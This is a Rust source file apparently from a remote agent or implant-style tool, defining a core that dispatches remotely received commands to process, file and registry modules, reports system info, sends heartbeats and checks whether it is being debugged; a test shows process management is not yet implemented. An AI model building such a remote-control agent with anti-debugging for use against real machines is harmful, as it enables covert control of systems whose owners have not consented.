use agent_hardening::anti_debug;
use agent_modules::{file_manager, monitoring, process_manager, registry_manager};
use protocol::messages::{Command, Response};

pub struct AgentCore {
    pub id: u32,
}

impl AgentCore {
    #[must_use]
    pub fn new(id: u32) -> Self {
        Self { id }
    }

    pub async fn handle_command(&self, cmd: &Command) -> Option<Response> {
        if anti_debug::is_being_debugged() {
            log::warn!("Agent is being debugged");
        }

        match cmd {
            cmd_ref @ Command::Execute { cmd } => {
                if cmd.starts_with("proc:") {
                    process_manager::execute(cmd_ref).await
                } else if cmd.starts_with("file:") {
                    file_manager::execute(cmd_ref).await
                } else if cmd.starts_with("reg:") {
                    registry_manager::execute(cmd_ref).await
                } else {
                    process_manager::execute(cmd_ref).await
                }
            }
            Command::GetSysInfo => monitoring::get_sysinfo().await,
            Command::Heartbeat => Some(Response::Success),
            _ => None,
        }
    }

    pub fn heartbeat(&self) -> Response {
        Response::Success
    }
}

#[cfg(test)]
mod tests {
    use super::AgentCore;
    use protocol::messages::{Command, Response};

    #[tokio::test]
    async fn execute_commands_return_module_status() {
        let agent = AgentCore::new(1);
        let response = agent
            .handle_command(&Command::Execute {
                cmd: "proc:request".to_string(),
            })
            .await;

        assert_eq!(
            response,
            Some(Response::Failure {
                error: "process management is not implemented".to_string(),
            })
        );
    }
}
